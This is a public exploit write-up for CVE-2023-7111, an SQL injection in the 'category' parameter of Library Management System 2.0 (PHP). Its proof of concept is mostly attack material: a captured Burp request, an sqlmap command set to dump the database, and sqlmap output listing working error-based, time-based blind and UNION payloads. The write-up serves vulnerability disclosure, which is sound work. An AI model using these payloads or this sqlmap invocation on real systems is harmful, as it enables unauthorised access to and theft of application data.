# CVE-2023-7111_Library-Management-System_SQL_Injection-3
+ **Exploit Title:** CVE-2023-7111_Library-Management-System_SQL_Injection-3
+ **Date:** 2023-23-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/library-management-system-in-php-with-source-code-ver-2-0/
+ **Software Link:** https://download-media.code-projects.org/2020/02/LIBRARY_MANAGEMENT_SYSTEM_IN_PHP_WITH_SOURCE_CODE_VER.2.0.zip
+ **Version:** 2.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
+ **CVE:** CVE-2023-7111
  
## References: 
+ **CVE-2023-7111:** https://vuldb.com/?id.249006
+ https://www.cve.org/CVERecord?id=CVE-2023-7111

## Description:
Library Management System 2.0 allows SQL Injection via parameter 'category' in "/libsystem/index.php?category=1".
Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to the application: "http://localhost/libsystem/index.php"
+ Select the Category from combobox.
+ Intercept the request via Burp Suite and send to Repeater.
+ Copy and paste the request to a "r.txt" file.
+ Captured Burp request:
```
GET /libsystem/index.php?category=1 HTTP/1.1
Host: localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Cookie: PHPSESSID=9p3s52249uv1qh0sp602kn39ul
Referer: http://localhost/libsystem/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
```

+ Use sqlmap to exploit. In sqlmap, use 'category' parameter to dump the database. 
```
python sqlmap.py -r r.txt -p category --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
```

```
---
Parameter: category (GET)
    Type: error-based
    Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: category=-7874 OR 1 GROUP BY CONCAT(0x717a7a6b71,(SELECT (CASE WHEN (3499=3499) THEN 1 ELSE 0 END)),0x71716a7a71,FLOOR(RAND(0)*2)) HAVING MIN(0)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: category=(CASE WHEN (6694=6694) THEN SLEEP(5) ELSE 6694 END)

    Type: UNION query
    Title: Generic UNION query (random number) - 8 columns
    Payload: category=-5673 UNION ALL SELECT 7143,7143,7143,CONCAT(0x717a7a6b71,0x58617168457a765948785a58544179556e546b714668456e76436d48635046707750794a64734b61,0x71716a7a71),7143,7143,7143,7143-- -
---
[12:46:50] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.1.6, Apache 2.4.53
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[12:46:50] [INFO] fetching current database
current database: 'libsystem'
```

+ current database: `libsystem`
![3](https://github.com/h4md153v63n/CVEs/assets/5091265/2f9bc202-cb7c-4622-ac38-69252d03bfe5)


